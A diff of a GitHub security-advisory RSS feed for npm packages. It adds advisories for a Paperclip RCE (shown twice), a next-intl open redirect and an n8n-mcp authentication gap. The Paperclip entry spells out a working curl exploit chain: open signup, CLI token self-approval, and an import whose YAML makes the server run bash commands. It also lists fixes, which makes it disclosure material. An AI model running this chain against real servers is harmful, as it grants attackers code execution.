@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/npm.rss</id>
     <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
-    <updated>2026-04-10T20:59:34.596Z</updated>
+    <updated>2026-04-10T21:47:06.341Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
     <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
@@ -11,6 +11,410 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[@paperclipai/server] paperclip Vulnerable to Unauthenticated Remote Code Execution via Import Authorization Bypass]]></title>
+        <id>https://github.com/advisories/GHSA-68qg-g8mg-6pr7</id>
+        <link href="https://github.com/advisories/GHSA-68qg-g8mg-6pr7"/>
+        <updated>2026-04-10T21:08:59.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>An unauthenticated attacker can achieve full remote code execution on any network-accessible Paperclip instance running in <code>authenticated</code> mode with default configuration. No user interaction, no credentials, just the target's address. The entire chain is six API calls.</p>
+<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
+<p>The attack chains four independent flaws to escalate from zero access to RCE:</p>
+<h3 id="step-1-create-an-account-no-invite-no-email-verification">Step 1: Create an account (no invite, no email verification)</h3>
+<pre><code class="language-bash">curl -s -X POST -H "Content-Type: application/json" \
+  -d '{"email":"attacker@evil.com","password":"P@ssw0rd123","name":"attacker"}' \
+  http://&lt;target&gt;:3100/api/auth/sign-up/email
+</code></pre>
+<p>Returns a valid account immediately. No invite token required, no email verification.</p>
+<p>This works because <code>PAPERCLIP_AUTH_DISABLE_SIGN_UP</code> defaults to <code>false</code> in <code>server/src/config.ts:169-173</code>:</p>
+<pre><code class="language-typescript">const authDisableSignUp: boolean =
+  disableSignUpFromEnv !== undefined
+    ? disableSignUpFromEnv === "true"
+    : (fileConfig?.auth?.disableSignUp ?? false);   // default: open
+</code></pre>
+<p>And email verification is hardcoded off in <code>server/src/auth/better-auth.ts:89-93</code>:</p>
+<pre><code class="language-typescript">emailAndPassword: {
+  enabled: true,
+  requireEmailVerification: false,
+  disableSignUp: config.authDisableSignUp,
+},
+</code></pre>
+<p>The environment variable isn't documented in the deployment guide, so operators don't know it exists.</p>
+<h3 id="step-2-sign-in">Step 2: Sign in</h3>
+<pre><code class="language-bash">curl -s -v -X POST -H "Content-Type: application/json" \
+  -d '{"email":"attacker@evil.com","password":"P@ssw0rd123"}' \
+  http://&lt;target&gt;:3100/api/auth/sign-in/email
+</code></pre>
+<p>Capture the session cookie from the <code>Set-Cookie</code> header.</p>
+<h3 id="step-3-create-a-cli-auth-challenge-and-self-approve-it">Step 3: Create a CLI auth challenge and self-approve it</h3>
+<p>Create the challenge (no authentication required at all):</p>
+<pre><code class="language-bash">curl -s -X POST -H "Content-Type: application/json" \
+  -d '{"command":"test"}' \
+  http://&lt;target&gt;:3100/api/cli-auth/challenges
+</code></pre>
+<p>The response includes a <code>token</code> and a <code>boardApiToken</code>. The handler at <code>server/src/routes/access.ts:1638-1659</code> has no actor check -- anyone can create a challenge.</p>
+<p>Now approve it with our own session:</p>
+<pre><code class="language-bash">curl -s -X POST \
+  -H "Cookie: &lt;session-cookie&gt;" \
+  -H "Content-Type: application/json" \
+  -H "Origin: http://&lt;target&gt;:3100" \
+  -d '{"token":"&lt;token-from-above&gt;"}' \
+  http://&lt;target&gt;:3100/api/cli-auth/challenges/&lt;id&gt;/approve
+</code></pre>
+<p>The approval handler at <code>server/src/routes/access.ts:1687-1704</code> checks that the caller is a board user but does not check whether the approver is the same person who created the challenge:</p>
+<pre><code class="language-typescript">if (req.actor.type !== "board" || (!req.actor.userId &amp;&amp; !isLocalImplicit(req))) {
+  throw unauthorized("Sign in before approving CLI access");
+}
+// no check that approver !== creator
+const userId = req.actor.userId ?? "local-board";
+const approved = await boardAuth.approveCliAuthChallenge(id, req.body.token, userId);
+</code></pre>
+<p>The <code>boardApiToken</code> from step 3 is now a persistent API key tied to our account.</p>
+<h3 id="step-4-create-a-company-and-deploy-an-agent-via-import-authorization-bypass">Step 4: Create a company and deploy an agent via import (authorization bypass)</h3>
+<p>This is the critical flaw. The direct company creation endpoint correctly requires instance admin:</p>
+<p><code>server/src/routes/companies.ts:260-264</code>:</p>
+<pre><code class="language-typescript">router.post("/", validate(createCompanySchema), async (req, res) =&gt; {
+  assertBoard(req);
+  if (!(req.actor.source === "local_implicit" || req.actor.isInstanceAdmin)) {
+    throw forbidden("Instance admin required");
+  }
+});
+</code></pre>
+<p>But the import endpoint does not:</p>
+<p><code>server/src/routes/companies.ts:170-176</code>:</p>
+<pre><code class="language-typescript">router.post("/import", validate(companyPortabilityImportSchema), async (req, res) =&gt; {
+  assertBoard(req);                                     // only checks board type
+  if (req.body.target.mode === "existing_company") {
+    assertCompanyAccess(req, req.body.target.companyId);  // only for existing
+  }
+  // NO assertInstanceAdmin for "new_company" mode
+  const result = await portability.importBundle(req.body, ...);
+});
+</code></pre>
+<p><code>assertInstanceAdmin</code> isn't even imported in <code>companies.ts</code> (line 27 only imports <code>assertBoard</code>, <code>assertCompanyAccess</code>, <code>getActorInfo</code>), while it is imported and used in other route files like <code>agents.ts</code>.</p>
+<p>The import also accepts a <code>.paperclip.yaml</code> in the bundle that specifies agent adapter configuration. The <code>process</code> adapter takes a <code>command</code> and <code>args</code> and calls <code>spawn()</code> directly with zero sandboxing. The import service passes the full <code>adapterConfig</code> through without validation (<code>server/src/services/company-portability.ts:3955-3981</code>).</p>
+<pre><code class="language-bash">curl -s -X POST -H "Authorization: Bearer &lt;board-api-key&gt;" \
+  -H "Content-Type: application/json" \
+  -H "Origin: http://&lt;target&gt;:3100" \
+  -d '{
+    "source": {"type": "inline", "files": {
+      "COMPANY.md": "---\nname: attacker-corp\nslug: attacker-corp\n---\nx",
+      "agents/pwn/AGENTS.md": "---\nkind: agent\nname: pwn\nslug: pwn\nrole: engineer\n---\nx",
+      ".paperclip.yaml": "agents:\n  pwn:\n    icon: terminal\n    adapter:\n      type: process\n      config:\n        command: bash\n        args:\n          - -c\n          - id &gt; /tmp/pwned.txt &amp;&amp; whoami &gt;&gt; /tmp/pwned.txt"
+    }},
+    "target": {"mode": "new_company", "newCompanyName": "attacker-corp"},
+    "include": {"company": true, "agents": true},
+    "agents": "all"
+  }' \
+  http://&lt;target&gt;:3100/api/companies/import
+</code></pre>
+<p>Returns the new company ID and agent ID. The attacker now owns a company with a process adapter agent configured to run arbitrary commands.</p>
+<h3 id="step-5-trigger-the-agent">Step 5: Trigger the agent</h3>
+<pre><code class="language-bash">curl -s -X POST -H "Authorization: Bearer &lt;board-api-key&gt;" \
+  -H "Content-Type: application/json" \
+  -H "Origin: http://&lt;target&gt;:3100" \
+  -d '{}' \
+  http://&lt;target&gt;:3100/api/agents/&lt;agent-id&gt;/wakeup
+</code></pre>
+<p>The wakeup handler at <code>server/src/routes/agents.ts:2073-2085</code> only checks <code>assertCompanyAccess</code>, which passes because the attacker created the company. Paperclip spawns <code>bash -c "id &gt; /tmp/pwned.txt &amp;&amp; ..."</code> as the server's OS user.</p>
+<h3 id="proof-of-concept">Proof of Concept</h3>
+<p>I have a self-contained bash script that runs the full chain automatically:</p>
+<pre><code>./poc_exploit.sh http://&lt;target&gt;:3100
+</code></pre>
+<p>It creates a random test account, self-approves a CLI key, imports a company with a process adapter agent, triggers it, and checks for a marker file to confirm execution. Runs in under 30 seconds.</p>
+<h2 id="impact">Impact</h2>
+<p>An unauthenticated remote attacker can execute arbitrary commands as the Paperclip server's OS user on any <code>authenticated</code> mode deployment with default configuration. This gives them:</p>
+<ul>
+<li>Full filesystem access (read/write as the server user)</li>
+<li>Access to all data in the Paperclip database</li>
+<li>Ability to pivot to internal network services</li>
+<li>Ability to disrupt all agent operations</li>
+</ul>
+<p>The attack is fully automated, requires no user interaction, and works against the default deployment configuration.</p>
+<h2 id="suggested-fixes">Suggested Fixes</h2>
+<h3 id="critical-unauthorized-board-access-the-root-cause">Critical: Unauthorized board access (the root cause)</h3>
+<p>The import bypass is how I got RCE today, but the real problem is that anyone can go from unauthenticated to a fully persistent board user through open signup + self-approve. Even if you fix the import endpoint, the attacker still has a board API key and can:</p>
+<ul>
+<li>Read adapter configurations and internal API structure</li>
+<li>Approve/reject/request-revision on any company's approvals (these endpoints only check <code>assertBoard</code>, not <code>assertCompanyAccess</code>)</li>
+<li>Cancel any company's agent runs (same missing check)</li>
+<li>Read issue data from any heartbeat run (zero auth on <code>GET /api/heartbeat-runs/:runId/issues</code>)</li>
+<li>Create unlimited accounts for resource exhaustion</li>
+<li>Wait for the next authorization bug to appear</li>
+</ul>
+<p><strong>These need to be fixed together:</strong></p>
+<ol>
+<li><p><strong>Disable open registration by default</strong> -- <code>server/src/config.ts:172</code>, change <code>?? false</code> to <code>?? true</code>. Document <code>PAPERCLIP_AUTH_DISABLE_SIGN_UP</code> in the deployment guide. Any deployment that wants open signup can opt in explicitly.</p>
+</li>
+<li><p><strong>Prevent CLI auth self-approval</strong> -- <code>server/src/routes/access.ts</code>, around line 1700. Reject when the approving user is the same user who created the challenge. Right now anyone with a session can generate their own persistent API key.</p>
+</li>
+<li><p><strong>Require email verification</strong> -- <code>server/src/auth/better-auth.ts:91</code>, set <code>requireEmailVerification: true</code>. At minimum this stops throwaway accounts.</p>
+</li>
+</ol>
+<h3 id="critical-import-authorization-bypass-the-rce-path">Critical: Import authorization bypass (the RCE path)</h3>
+<ol start="4">
+<li><strong>Add <code>assertInstanceAdmin</code> to the import endpoint for <code>new_company</code> mode</strong> -- <code>server/src/routes/companies.ts</code>, lines 161-176. The direct <code>POST /</code> creation endpoint already has this check. The import endpoint doesn't. Apply the same check to both <code>POST /import</code> and <code>POST /import/preview</code>:</li>
+</ol>
+<pre><code class="language-typescript">assertBoard(req);
+if (req.body.target.mode === "new_company") {
+  if (!(req.actor.source === "local_implicit" || req.actor.isInstanceAdmin)) {
+    throw forbidden("Instance admin required");
+  }
+} else {
+  assertCompanyAccess(req, req.body.target.companyId);
+}
+</code></pre>
+<h2 id="contact">Contact</h2>
+<p>Discord: sagi03581</p>
+<p><a href="https://github.com/user-attachments/assets/50c4520a-9ea1-48bd-95b5-8e370d8110c3">https://github.com/user-attachments/assets/50c4520a-9ea1-48bd-95b5-8e370d8110c3</a></p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/paperclipai/paperclip/security/advisories/GHSA-68qg-g8mg-6pr7">https://github.com/paperclipai/paperclip/security/advisories/GHSA-68qg-g8mg-6pr7</a></li>
+<li><a href="https://github.com/advisories/GHSA-68qg-g8mg-6pr7">https://github.com/advisories/GHSA-68qg-g8mg-6pr7</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-68qg-g8mg-6pr7</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-04-10T21:08:57.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[paperclipai] paperclip Vulnerable to Unauthenticated Remote Code Execution via Import Authorization Bypass]]></title>
+        <id>https://github.com/advisories/GHSA-68qg-g8mg-6pr7</id>
+        <link href="https://github.com/advisories/GHSA-68qg-g8mg-6pr7"/>
+        <updated>2026-04-10T21:08:59.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>An unauthenticated attacker can achieve full remote code execution on any network-accessible Paperclip instance running in <code>authenticated</code> mode with default configuration. No user interaction, no credentials, just the target's address. The entire chain is six API calls.</p>
+<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
+<p>The attack chains four independent flaws to escalate from zero access to RCE:</p>
+<h3 id="step-1-create-an-account-no-invite-no-email-verification">Step 1: Create an account (no invite, no email verification)</h3>
+<pre><code class="language-bash">curl -s -X POST -H "Content-Type: application/json" \
+  -d '{"email":"attacker@evil.com","password":"P@ssw0rd123","name":"attacker"}' \
+  http://&lt;target&gt;:3100/api/auth/sign-up/email
+</code></pre>
+<p>Returns a valid account immediately. No invite token required, no email verification.</p>
+<p>This works because <code>PAPERCLIP_AUTH_DISABLE_SIGN_UP</code> defaults to <code>false</code> in <code>server/src/config.ts:169-173</code>:</p>
+<pre><code class="language-typescript">const authDisableSignUp: boolean =
+  disableSignUpFromEnv !== undefined
+    ? disableSignUpFromEnv === "true"
+    : (fileConfig?.auth?.disableSignUp ?? false);   // default: open
+</code></pre>
+<p>And email verification is hardcoded off in <code>server/src/auth/better-auth.ts:89-93</code>:</p>
+<pre><code class="language-typescript">emailAndPassword: {
+  enabled: true,
+  requireEmailVerification: false,
+  disableSignUp: config.authDisableSignUp,
+},
+</code></pre>
+<p>The environment variable isn't documented in the deployment guide, so operators don't know it exists.</p>
+<h3 id="step-2-sign-in">Step 2: Sign in</h3>
+<pre><code class="language-bash">curl -s -v -X POST -H "Content-Type: application/json" \
+  -d '{"email":"attacker@evil.com","password":"P@ssw0rd123"}' \
+  http://&lt;target&gt;:3100/api/auth/sign-in/email
+</code></pre>
+<p>Capture the session cookie from the <code>Set-Cookie</code> header.</p>
+<h3 id="step-3-create-a-cli-auth-challenge-and-self-approve-it">Step 3: Create a CLI auth challenge and self-approve it</h3>
+<p>Create the challenge (no authentication required at all):</p>
+<pre><code class="language-bash">curl -s -X POST -H "Content-Type: application/json" \
+  -d '{"command":"test"}' \
+  http://&lt;target&gt;:3100/api/cli-auth/challenges
+</code></pre>
+<p>The response includes a <code>token</code> and a <code>boardApiToken</code>. The handler at <code>server/src/routes/access.ts:1638-1659</code> has no actor check -- anyone can create a challenge.</p>
+<p>Now approve it with our own session:</p>
+<pre><code class="language-bash">curl -s -X POST \
+  -H "Cookie: &lt;session-cookie&gt;" \
+  -H "Content-Type: application/json" \
+  -H "Origin: http://&lt;target&gt;:3100" \
+  -d '{"token":"&lt;token-from-above&gt;"}' \
+  http://&lt;target&gt;:3100/api/cli-auth/challenges/&lt;id&gt;/approve
+</code></pre>
+<p>The approval handler at <code>server/src/routes/access.ts:1687-1704</code> checks that the caller is a board user but does not check whether the approver is the same person who created the challenge:</p>
+<pre><code class="language-typescript">if (req.actor.type !== "board" || (!req.actor.userId &amp;&amp; !isLocalImplicit(req))) {
+  throw unauthorized("Sign in before approving CLI access");
+}
+// no check that approver !== creator
+const userId = req.actor.userId ?? "local-board";
+const approved = await boardAuth.approveCliAuthChallenge(id, req.body.token, userId);
+</code></pre>
+<p>The <code>boardApiToken</code> from step 3 is now a persistent API key tied to our account.</p>
+<h3 id="step-4-create-a-company-and-deploy-an-agent-via-import-authorization-bypass">Step 4: Create a company and deploy an agent via import (authorization bypass)</h3>
+<p>This is the critical flaw. The direct company creation endpoint correctly requires instance admin:</p>
+<p><code>server/src/routes/companies.ts:260-264</code>:</p>
+<pre><code class="language-typescript">router.post("/", validate(createCompanySchema), async (req, res) =&gt; {
+  assertBoard(req);
+  if (!(req.actor.source === "local_implicit" || req.actor.isInstanceAdmin)) {
+    throw forbidden("Instance admin required");
+  }
+});
+</code></pre>
+<p>But the import endpoint does not:</p>
+<p><code>server/src/routes/companies.ts:170-176</code>:</p>
+<pre><code class="language-typescript">router.post("/import", validate(companyPortabilityImportSchema), async (req, res) =&gt; {
+  assertBoard(req);                                     // only checks board type
+  if (req.body.target.mode === "existing_company") {
+    assertCompanyAccess(req, req.body.target.companyId);  // only for existing
+  }
+  // NO assertInstanceAdmin for "new_company" mode
+  const result = await portability.importBundle(req.body, ...);
+});
+</code></pre>
+<p><code>assertInstanceAdmin</code> isn't even imported in <code>companies.ts</code> (line 27 only imports <code>assertBoard</code>, <code>assertCompanyAccess</code>, <code>getActorInfo</code>), while it is imported and used in other route files like <code>agents.ts</code>.</p>
+<p>The import also accepts a <code>.paperclip.yaml</code> in the bundle that specifies agent adapter configuration. The <code>process</code> adapter takes a <code>command</code> and <code>args</code> and calls <code>spawn()</code> directly with zero sandboxing. The import service passes the full <code>adapterConfig</code> through without validation (<code>server/src/services/company-portability.ts:3955-3981</code>).</p>
+<pre><code class="language-bash">curl -s -X POST -H "Authorization: Bearer &lt;board-api-key&gt;" \
+  -H "Content-Type: application/json" \
+  -H "Origin: http://&lt;target&gt;:3100" \
+  -d '{
+    "source": {"type": "inline", "files": {
+      "COMPANY.md": "---\nname: attacker-corp\nslug: attacker-corp\n---\nx",
+      "agents/pwn/AGENTS.md": "---\nkind: agent\nname: pwn\nslug: pwn\nrole: engineer\n---\nx",
+      ".paperclip.yaml": "agents:\n  pwn:\n    icon: terminal\n    adapter:\n      type: process\n      config:\n        command: bash\n        args:\n          - -c\n          - id &gt; /tmp/pwned.txt &amp;&amp; whoami &gt;&gt; /tmp/pwned.txt"
+    }},
+    "target": {"mode": "new_company", "newCompanyName": "attacker-corp"},
+    "include": {"company": true, "agents": true},
+    "agents": "all"
+  }' \
+  http://&lt;target&gt;:3100/api/companies/import
+</code></pre>
+<p>Returns the new company ID and agent ID. The attacker now owns a company with a process adapter agent configured to run arbitrary commands.</p>
+<h3 id="step-5-trigger-the-agent">Step 5: Trigger the agent</h3>
+<pre><code class="language-bash">curl -s -X POST -H "Authorization: Bearer &lt;board-api-key&gt;" \
+  -H "Content-Type: application/json" \
+  -H "Origin: http://&lt;target&gt;:3100" \
+  -d '{}' \
+  http://&lt;target&gt;:3100/api/agents/&lt;agent-id&gt;/wakeup
+</code></pre>
+<p>The wakeup handler at <code>server/src/routes/agents.ts:2073-2085</code> only checks <code>assertCompanyAccess</code>, which passes because the attacker created the company. Paperclip spawns <code>bash -c "id &gt; /tmp/pwned.txt &amp;&amp; ..."</code> as the server's OS user.</p>
+<h3 id="proof-of-concept">Proof of Concept</h3>
+<p>I have a self-contained bash script that runs the full chain automatically:</p>
+<pre><code>./poc_exploit.sh http://&lt;target&gt;:3100
+</code></pre>
+<p>It creates a random test account, self-approves a CLI key, imports a company with a process adapter agent, triggers it, and checks for a marker file to confirm execution. Runs in under 30 seconds.</p>
+<h2 id="impact">Impact</h2>
+<p>An unauthenticated remote attacker can execute arbitrary commands as the Paperclip server's OS user on any <code>authenticated</code> mode deployment with default configuration. This gives them:</p>
+<ul>
+<li>Full filesystem access (read/write as the server user)</li>
+<li>Access to all data in the Paperclip database</li>
+<li>Ability to pivot to internal network services</li>
+<li>Ability to disrupt all agent operations</li>
+</ul>
+<p>The attack is fully automated, requires no user interaction, and works against the default deployment configuration.</p>
+<h2 id="suggested-fixes">Suggested Fixes</h2>
+<h3 id="critical-unauthorized-board-access-the-root-cause">Critical: Unauthorized board access (the root cause)</h3>
+<p>The import bypass is how I got RCE today, but the real problem is that anyone can go from unauthenticated to a fully persistent board user through open signup + self-approve. Even if you fix the import endpoint, the attacker still has a board API key and can:</p>
+<ul>
+<li>Read adapter configurations and internal API structure</li>
+<li>Approve/reject/request-revision on any company's approvals (these endpoints only check <code>assertBoard</code>, not <code>assertCompanyAccess</code>)</li>
+<li>Cancel any company's agent runs (same missing check)</li>
+<li>Read issue data from any heartbeat run (zero auth on <code>GET /api/heartbeat-runs/:runId/issues</code>)</li>
+<li>Create unlimited accounts for resource exhaustion</li>
+<li>Wait for the next authorization bug to appear</li>
+</ul>
+<p><strong>These need to be fixed together:</strong></p>
+<ol>
+<li><p><strong>Disable open registration by default</strong> -- <code>server/src/config.ts:172</code>, change <code>?? false</code> to <code>?? true</code>. Document <code>PAPERCLIP_AUTH_DISABLE_SIGN_UP</code> in the deployment guide. Any deployment that wants open signup can opt in explicitly.</p>
+</li>
+<li><p><strong>Prevent CLI auth self-approval</strong> -- <code>server/src/routes/access.ts</code>, around line 1700. Reject when the approving user is the same user who created the challenge. Right now anyone with a session can generate their own persistent API key.</p>
+</li>
+<li><p><strong>Require email verification</strong> -- <code>server/src/auth/better-auth.ts:91</code>, set <code>requireEmailVerification: true</code>. At minimum this stops throwaway accounts.</p>
+</li>
+</ol>
+<h3 id="critical-import-authorization-bypass-the-rce-path">Critical: Import authorization bypass (the RCE path)</h3>
+<ol start="4">
+<li><strong>Add <code>assertInstanceAdmin</code> to the import endpoint for <code>new_company</code> mode</strong> -- <code>server/src/routes/companies.ts</code>, lines 161-176. The direct <code>POST /</code> creation endpoint already has this check. The import endpoint doesn't. Apply the same check to both <code>POST /import</code> and <code>POST /import/preview</code>:</li>
+</ol>
+<pre><code class="language-typescript">assertBoard(req);
+if (req.body.target.mode === "new_company") {
+  if (!(req.actor.source === "local_implicit" || req.actor.isInstanceAdmin)) {
+    throw forbidden("Instance admin required");
+  }
+} else {
+  assertCompanyAccess(req, req.body.target.companyId);
+}
+</code></pre>
+<h2 id="contact">Contact</h2>
+<p>Discord: sagi03581</p>
+<p><a href="https://github.com/user-attachments/assets/50c4520a-9ea1-48bd-95b5-8e370d8110c3">https://github.com/user-attachments/assets/50c4520a-9ea1-48bd-95b5-8e370d8110c3</a></p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/paperclipai/paperclip/security/advisories/GHSA-68qg-g8mg-6pr7">https://github.com/paperclipai/paperclip/security/advisories/GHSA-68qg-g8mg-6pr7</a></li>
+<li><a href="https://github.com/advisories/GHSA-68qg-g8mg-6pr7">https://github.com/advisories/GHSA-68qg-g8mg-6pr7</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-68qg-g8mg-6pr7</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-04-10T21:08:57.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[next-intl] next-intl has an open redirect vulnerability]]></title>
+        <id>https://github.com/advisories/GHSA-8f24-v5vv-gm5j</id>
+        <link href="https://github.com/advisories/GHSA-8f24-v5vv-gm5j"/>
+        <updated>2026-04-10T21:03:58.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>Applications using the <code>next-intl</code> middleware with <code>localePrefix: 'as-needed'</code> could construct URLs where path handling and the WHATWG URL parser resolved a relative redirect target to another host (e.g. scheme-relative <code>//</code> or control characters stripped by the URL parser), so the middleware could redirect the browser off-site while the user still started from a trusted app URL.</p>
+<h3 id="patches">Patches</h3>
+<p>The problem has been patched, please update to <a href="https://github.com/amannn/next-intl/releases/tag/v4.9.1"><code>next-intl@4.9.1</code></a>.</p>
+<h3 id="credits">Credits</h3>
+<p>Many thanks to <a href="https://github.com/joniumGit">Joni Liljeblad</a> from <a href="https://ouraring.com">Oura</a> for responsibly disclosing the vulnerability and for suggesting the fix.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/amannn/next-intl/security/advisories/GHSA-8f24-v5vv-gm5j">https://github.com/amannn/next-intl/security/advisories/GHSA-8f24-v5vv-gm5j</a></li>
+<li><a href="https://github.com/amannn/next-intl/pull/2304">https://github.com/amannn/next-intl/pull/2304</a></li>
+<li><a href="https://github.com/amannn/next-intl/commit/1c80b668aa6d853f470319eec10a3f61e78a70e6">https://github.com/amannn/next-intl/commit/1c80b668aa6d853f470319eec10a3f61e78a70e6</a></li>
+<li><a href="https://github.com/amannn/next-intl/releases/tag/v4.9.1">https://github.com/amannn/next-intl/releases/tag/v4.9.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-8f24-v5vv-gm5j">https://github.com/advisories/GHSA-8f24-v5vv-gm5j</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-8f24-v5vv-gm5j</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-04-10T21:03:55.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[n8n-mcp] n8n-mcp has unauthenticated session termination and information disclosure in HTTP transport]]></title>
+        <id>https://github.com/advisories/GHSA-75hx-xj24-mqrw</id>
+        <link href="https://github.com/advisories/GHSA-75hx-xj24-mqrw"/>
+        <updated>2026-04-10T20:59:59.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Several HTTP transport endpoints in n8n-mcp lacked proper authentication, and the health check endpoint exposed sensitive operational metadata without credentials.</p>
+<h3 id="impact">Impact</h3>
+<p>An unauthenticated attacker with network access to the n8n-mcp HTTP server could disrupt active MCP sessions and gather information useful for further attacks.</p>
+<h3 id="patches">Patches</h3>
+<p>Fixed in <strong>v2.47.6</strong>. All MCP session endpoints now require Bearer authentication. The health check endpoint has been reduced to a minimal liveness response.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>If you cannot upgrade immediately:</p>
+<ul>
+<li><strong>Restrict network access</strong> to the HTTP server using firewall rules, reverse proxy IP allowlists, or a VPN so that only trusted clients can reach it.</li>
+<li><strong>Use stdio mode</strong> (<code>MCP_MODE=stdio</code>) instead of HTTP mode. The stdio transport does not expose any HTTP endpoints and is unaffected by this vulnerability.</li>
+</ul>
+<p>Upgrading to v2.47.6 is still strongly recommended.</p>
+<h3 id="credit">Credit</h3>
+<p>Reported by @yotampe-pluto.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/czlonkowski/n8n-mcp/security/advisories/GHSA-75hx-xj24-mqrw">https://github.com/czlonkowski/n8n-mcp/security/advisories/GHSA-75hx-xj24-mqrw</a></li>
+<li><a href="https://github.com/czlonkowski/n8n-mcp/commit/ca9d4b3df6419b8338983be98f7940400f78bde3">https://github.com/czlonkowski/n8n-mcp/commit/ca9d4b3df6419b8338983be98f7940400f78bde3</a></li>
+<li><a href="https://github.com/czlonkowski/n8n-mcp/releases/tag/v2.47.6">https://github.com/czlonkowski/n8n-mcp/releases/tag/v2.47.6</a></li>
+<li><a href="https://github.com/advisories/GHSA-75hx-xj24-mqrw">https://github.com/advisories/GHSA-75hx-xj24-mqrw</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-75hx-xj24-mqrw</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-04-10T20:59:58.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[openclaw] Duplicate Advisory: OpenClaw: Windows media loaders accepted remote-host file URLs before local path validation]]></title>
         <id>https://github.com/advisories/GHSA-8h8f-7cxm-m38j</id>
@@ -471,357 +875,5 @@
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-04-10T00:30:30.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[openclaw] Duplicate Advisory: OpenClaw: Plivo V2 verified replay identity drifts on query-only variants]]></title>
-        <id>https://github.com/advisories/GHSA-j56c-wpqm-h24x</id>
-        <link href="https://github.com/advisories/GHSA-j56c-wpqm-h24x"/>
-        <updated>2026-04-10T20:18:47.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="duplicate-advisory">Duplicate Advisory</h3>
-<p>This advisory has been withdrawn because it is a duplicate of GHSA-cg6c-q2hx-69h7. This link is maintained to preserve external references.</p>
-<h3 id="original-description">Original Description</h3>
-<p>OpenClaw before 2026.3.23 contains a replay identity vulnerability in Plivo V2 signature verification that allows attackers to bypass replay protection by modifying query parameters. The verification path derives replay keys from the full URL including query strings instead of the canonicalized base URL, enabling attackers to mint new verified request keys through unsigned query-only changes to signed requests.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/openclaw/openclaw/security/advisories/GHSA-cg6c-q2hx-69h7">https://github.com/openclaw/openclaw/security/advisories/GHSA-cg6c-q2hx-69h7</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-35618">https://nvd.nist.gov/vuln/detail/CVE-2026-35618</a></li>
-<li><a href="https://github.com/openclaw/openclaw/commit/630f1479c44f78484dfa21bb407cbe6f171dac87">https://github.com/openclaw/openclaw/commit/630f1479c44f78484dfa21bb407cbe6f171dac87</a></li>
-<li><a href="https://github.com/openclaw/openclaw/commit/b0ce53a79cf63834660270513e26d921899b4e5b">https://github.com/openclaw/openclaw/commit/b0ce53a79cf63834660270513e26d921899b4e5b</a></li>
-<li><a href="https://www.vulncheck.com/advisories/openclaw-replay-identity-drift-via-query-only-variants-in-plivo-v2-verification">https://www.vulncheck.com/advisories/openclaw-replay-identity-drift-via-query-only-variants-in-plivo-v2-verification</a></li>
-<li><a href="https://github.com/advisories/GHSA-j56c-wpqm-h24x">https://github.com/advisories/GHSA-j56c-wpqm-h24x</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-j56c-wpqm-h24x</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-04-10T00:30:29.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[basic-ftp] basic-ftp: Incomplete CRLF Injection Protection Allows Arbitrary FTP Command Execution via Credentials and MKD Commands]]></title>
-        <id>https://github.com/advisories/GHSA-6v7q-wjvx-w8wg</id>
-        <link href="https://github.com/advisories/GHSA-6v7q-wjvx-w8wg"/>
-        <updated>2026-04-10T20:18:24.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
